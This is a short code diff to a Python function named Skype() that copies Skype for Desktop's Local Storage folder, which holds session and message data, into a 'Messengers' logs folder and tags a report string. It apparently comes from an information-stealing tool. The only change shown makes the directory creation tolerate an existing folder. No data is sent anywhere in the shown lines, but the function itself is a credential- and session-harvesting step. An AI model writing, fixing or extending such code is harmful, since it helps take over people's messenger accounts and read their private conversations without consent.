@@ -10,7 +10,7 @@ def Skype():
     pathToLogs = f'{user}\\{config.pathToLogs}\\Messengers\\Skype'
     path1 = r"\Microsoft\Skype for Desktop\Local Storage"
     try:
-        makedirs(pathToLogs)
+        makedirs(pathToLogs, exist_ok=True)
         copytree(rf"{local}{path1}",pathToLogs)
         data += "\n∟📨Skype"
         return data
